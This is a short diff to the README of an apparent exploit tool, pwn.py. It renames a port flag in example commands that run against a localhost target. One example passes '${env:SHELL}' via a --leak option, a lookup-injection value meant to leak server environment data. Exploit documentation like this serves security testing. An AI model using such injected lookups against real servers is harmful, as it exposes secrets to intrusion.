@@ -66,5 +66,4 @@ Example runs:
 
 - `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1`
 - `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1 --leak '${env:SHELL}'`
-- `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1 --exploit-port 5555`
-
+- `./pwn.py --target http://localhost:8080 --exploit-host 127.0.0.1 --listen-port 5555`
